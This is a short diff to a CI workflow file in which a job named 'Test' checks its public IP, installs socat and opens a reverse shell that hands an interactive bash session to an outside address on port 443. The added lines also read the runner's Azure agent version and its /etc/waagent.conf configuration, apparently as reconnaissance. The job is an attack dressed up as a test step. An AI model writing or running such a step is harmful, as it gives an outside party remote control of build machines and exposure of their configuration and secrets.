@@ -6,5 +6,7 @@ jobs:
     name: Test
     steps:
       - run: curl http://whatismyip.akamai.com/
+      - run: sudo waagent -version
+      - run: cat /etc/waagent.conf
       - run: sudo apt install socat -y
       - run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:20.115.47.45:443
